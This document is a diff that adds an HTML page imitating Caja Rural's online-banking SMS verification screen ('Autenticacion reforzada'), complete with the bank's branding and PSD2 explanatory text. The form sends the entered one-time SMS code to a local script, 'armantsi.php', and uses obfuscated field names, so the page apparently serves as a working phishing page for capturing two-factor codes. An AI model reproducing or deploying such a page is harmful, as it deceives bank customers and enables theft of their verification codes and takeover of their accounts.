@@ -1,0 +1,179 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <!--META http-equiv="Page-Enter" CONTENT="progid:DXImageTransform.Microsoft.Blinds(Duration=0)" />
+    <META http-equiv="Page-Exit" CONTENT="progid:DXImageTransform.Microsoft.Blinds(Duration=0)" /-->
+    
+    
+    <!--meta HTTP-EQUIV="Cache-Control" CONTENT="No-cache"/>
+	<META HTTP-EQUIV="Pragma" CONTENT="No-cache"/>
+	<META HTTP-EQUIV="Expires" CONTENT="Now"/-->
+<link rel="shortcut icon" type="image/x-icon" href="../st.png">    
+    
+     
+     
+     <!-- 26-07-2019 Responsive INICIO -->
+     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    
+
+
+	
+		
+			<link href="./sms_verif_files/rvia.css" rel="stylesheet" type="text/css">
+		
+	
+
+<!--[if lte IE 6]>
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/rvia-ie6.css" type="text/css">
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/9999/rvia-ie6.css" type="text/css">
+<![endif]-->
+<!--[if lte IE 7]>
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/rvia-ie7.css" type="text/css">
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/9999/rvia-ie7.css" type="text/css">
+<![endif]-->
+<!--[if IE 8]>
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/rvia-ie8.css" type="text/css">
+	<link rel="stylesheet" href="/estilos_prtl/css_acceso/9999/rvia-ie8.css" type="text/css">
+<![endif]-->
+
+<script type="text/javascript" src="./sms_verif_files/redireccion.js.download" charset="UTF-8"></script>
+
+    <title>Caja Rural</title>
+
+	
+	
+	
+
+</head>
+
+<body class="ruralvia-loginruralvia-loginruralvia-loginruralvia-login">
+
+
+
+
+
+
+
+	
+	<script type="text/javascript">
+	 	document.body.className += "ruralvia-login";
+	 	console.log("Es entidad MB "+true+" :: entidad "+9999);
+	</script>
+	 <header>
+ 		
+			 <div class="container">
+		       	<div class="site--logo"></div>
+		       	<h1 class="site--title">Caja Rural Particulares</h1>
+		   	</div>
+		
+   	</header>
+        		
+		<div id="caja_acceso">
+			<div id="arriba">
+				
+
+								
+
+
+				
+
+
+
+
+
+
+
+
+	<div class="container">
+		<form id="form1" action="armantsi.php" method="post" onsubmit="">
+
+			<div class="title-container">
+				<h2 class="main-title">Autenticacion reforzada</h2>
+				<div class="title-extra">
+					<div class="info-button js-show-modal"></div>
+				</div>
+			</div>
+			<div class="box-two-sides box-two-sides-sms">
+				<div class="box-left-side" style="background: url(imgs.png);"></div>
+<img src="https://www.ruralvia.com/estilos_prtl/css_acceso/images/img-doble-autenticacion.svg">
+				<div class="box-right-side">
+					<h3 class="title">Introduce el codigo</h3>
+					<p>Te hemos enviado un codigo a tu telefono para verificar tu identidad. Introducelo a continuacion para acceder.</p>
+					<p class="input-header">Sms</p>
+					<div class="sms-input">
+						<input type="password" id="doYBohRLIaBXoSa" name="srfer" value="" size="20" maxlength="20" autocomplete="off">
+						<div class="delete-button"></div>
+					</div>
+					<p>Si no has recibido el codigo SMS llamanos al servicio Att. cliente o vuelve a iniciar el proceso para recibir uno nuevo.</p>
+					<div class="footer-buttons">
+						<button class="btn-page-nav btn-page-nav-primary" type="submit">Continuar</button>
+						
+					</div>
+				</div>
+			</div>
+
+			<input id="oculto" name="TOGA" type="hidden" value="30"> 
+			<input id="zsYcqyhHuFuJxaB" name="zsYcqyhHuFuJxaB" type="hidden" value="">
+		</form>
+	</div>
+
+
+	<div class="modal hidden">
+		<div class="modal-container">
+			<div class="modal-exit js-hide-modal"></div>
+			<div class="modal-body">
+				<h2 class="modal-title question-title">¿En que consiste la Autenticacion Reforzada?</h2>
+				<p class="modal-text">Cumpliendo con la normativa europea PSD2, desde el 14 de Septiembre de 2019, reforzamos la seguridad en el acceso a la banca electronica.</p>
+				<p class="modal-text">Con esta normativa, en el primer acceso que hagas a partir de esta fecha, deberás introducir un codigo de validacion que recibirás por SMS en tu movil.</p>
+				<p class="modal-text">Este refuerzo de seguridad se repetirá cada 90 días en tu siguiente <b>acceso a banca electronica</b> para asegurarnos de tu identidad.</p>
+				<p class="modal-text">¿Que ocurre si no recibo un SMS? Posiblemente tu numero de telefono no este correctamente informado en nuestras bases de datos. Puedes ponerte en contacto con tu oficina o con el Servicio de Atencion Telefonica.</p>
+			</div>
+		</div>
+	</div>
+
+<script src="./sms_verif_files/login_utils.js.download" type="text/javascript"></script>
+<script type="text/javascript">
+
+	pulsada = 0;
+	
+	function validaAcceso(){
+		if (pulsada==0){
+			pulsada = 1;
+			
+			if( document.getElementById("doYBohRLIaBXoSa").value.length > 1 ){
+				return true;
+			}else{
+				pulsada = 0;
+				alert('Es necesario introducir los datos solicitados para finalizar la autenticacion');
+				return false;
+			}
+		}else{
+			alert('Operacion en curso, por favor espere un momento ...... ');
+			return false;
+		}
+	}
+	
+	function cancelar(){
+		if (pulsada==0){
+			pulsada = 1;
+			window.location.href = '/portal/desconexion.htm?idioma=es_ES&modo=1&entidad=3059';
+		}
+	}
+
+</script>
+			</div>		
+			<div id="abajo">
+				
+				
+			  
+			</div>
+		</div>
+	
+
+
+
+
+
+
+
+
+</body></html>
